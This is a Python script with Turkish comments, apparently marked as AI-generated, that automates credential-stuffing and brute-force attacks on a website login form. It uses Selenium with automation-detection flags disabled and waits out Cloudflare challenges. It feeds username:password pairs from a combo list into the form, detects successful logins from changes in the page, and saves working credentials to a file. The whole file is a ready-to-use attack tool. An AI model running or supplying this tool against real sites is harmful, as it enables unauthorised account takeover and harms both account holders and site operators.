# --- AI SIGNATURE: SELENIUM BRUTEFORCE.PY BASLANGIC ---
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from tqdm import tqdm
import time
from colorama import Fore, Style, init

init(autoreset=True)

parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda (görünmeden) çalıştır')
args = parser.parse_args()

# Combo wordlisti oku (username:password)
combos = []
with open(args.combo, encoding='utf-8', errors='ignore') as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        username, password = line.split(':', 1)
        combos.append((username, password))

print(f"[+] {len(combos)} combo (username:password) yüklendi.")

total_combos = len(combos)

# Selenium ayarları
chrome_options = Options()
if args.headless:
    chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-blink-features=AutomationControlled')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--window-size=1200,800')

success_count = 0
tried_count = 0
success_log = open('success.txt', 'w', encoding='utf-8')

try:
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(30)
    driver.get(args.url)
    time.sleep(3)  # Cloudflare challenge için bekle

    # Login formunu ve inputları otomatik bul
    form = None
    user_input = None
    pass_input = None
    submit_btn = None
    forms = driver.find_elements(By.TAG_NAME, 'form')
    for f in forms:
        try:
            inputs = f.find_elements(By.TAG_NAME, 'input')
            for inp in inputs:
                if inp.get_attribute('type') in ['password']:
                    form = f
                    break
            if form:
                break
        except Exception:
            continue
    if not form:
        print("[!] Login formu bulunamadı!")
        driver.quit()
        exit(1)
    # Kullanıcı adı ve şifre inputlarını bul
    inputs = form.find_elements(By.TAG_NAME, 'input')
    for inp in inputs:
        t = inp.get_attribute('type')
        n = inp.get_attribute('name')
        if t in ['text', 'email'] and not user_input:
            user_input = inp
        if t == 'password' and not pass_input:
            pass_input = inp
    if not user_input or not pass_input:
        print("[!] Kullanıcı adı veya şifre inputu bulunamadı!")
        driver.quit()
        exit(1)
    print(f"[+] Login formu bulundu!")
    print(f"    Kullanıcı adı inputu: {user_input.get_attribute('name')}")
    print(f"    Şifre inputu: {pass_input.get_attribute('name')}")
    # Submit butonunu bul
    submit_btn = None
    for inp in inputs:
        if inp.get_attribute('type') in ['submit', 'button']:
            submit_btn = inp
            break
    if not submit_btn:
        # Alternatif: formu Enter ile gönder
        submit_with_enter = True
    else:
        submit_with_enter = False

    # Başarısız giriş sonrası sayfa içeriği referansı
    user_input.clear()
    pass_input.clear()
    user_input.send_keys('wronguser')
    pass_input.send_keys('wrongpass')
    if submit_with_enter:
        pass_input.send_keys(Keys.RETURN)
    else:
        submit_btn.click()
    time.sleep(2)
    fail_url = driver.current_url
    fail_html = driver.page_source[:1000]

    with tqdm(total=total_combos, desc="Taranan kombinasyonlar", unit="combo") as pbar:
        for username, password in combos:
            tried_count += 1
            try:
                driver.get(args.url)
                time.sleep(1.5)
                # Formu tekrar bul
                form = None
                user_input = None
                pass_input = None
                forms = driver.find_elements(By.TAG_NAME, 'form')
                for f in forms:
                    try:
                        inputs = f.find_elements(By.TAG_NAME, 'input')
                        for inp in inputs:
                            if inp.get_attribute('type') in ['password']:
                                form = f
                                break
                        if form:
                            break
                    except Exception:
                        continue
                if not form:
                    tqdm.write(Fore.RED + f"[!] Form bulunamadı, atlanıyor.")
                    pbar.update(1)
                    continue
                inputs = form.find_elements(By.TAG_NAME, 'input')
                for inp in inputs:
                    t = inp.get_attribute('type')
                    if t in ['text', 'email'] and not user_input:
                        user_input = inp
                    if t == 'password' and not pass_input:
                        pass_input = inp
                if not user_input or not pass_input:
                    tqdm.write(Fore.RED + f"[!] Inputlar bulunamadı, atlanıyor.")
                    pbar.update(1)
                    continue
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(username)
                pass_input.send_keys(password)
                if submit_with_enter:
                    pass_input.send_keys(Keys.RETURN)
                else:
                    submit_btn.click()
                time.sleep(2)
                new_url = driver.current_url
                new_html = driver.page_source[:1000]
                # Başarı tespiti: url değişimi veya içerik değişimi
                if (new_url != fail_url) or (new_html != fail_html):
                    success_count += 1
                    tqdm.write(Fore.GREEN + Style.BRIGHT + f"[!!!] BAŞARILI: {username}:{password}")
                    success_log.write(f"{username}:{password}\n")
                    success_log.flush()
            except Exception as e:
                pbar.set_postfix_str(f"Hata: {e}", refresh=True)
                time.sleep(0.5)
            pbar.update(1)
    print(Fore.CYAN + f"\nToplam deneme: {tried_count}, Başarılı giriş: {success_count}")
    if not success_count:
        print(Fore.YELLOW + "[!] Başarılı giriş bulunamadı.")
finally:
    success_log.close()
    try:
        driver.quit()
    except Exception:
        pass
# --- AI SIGNATURE: SELENIUM BRUTEFORCE.PY BITIS --- 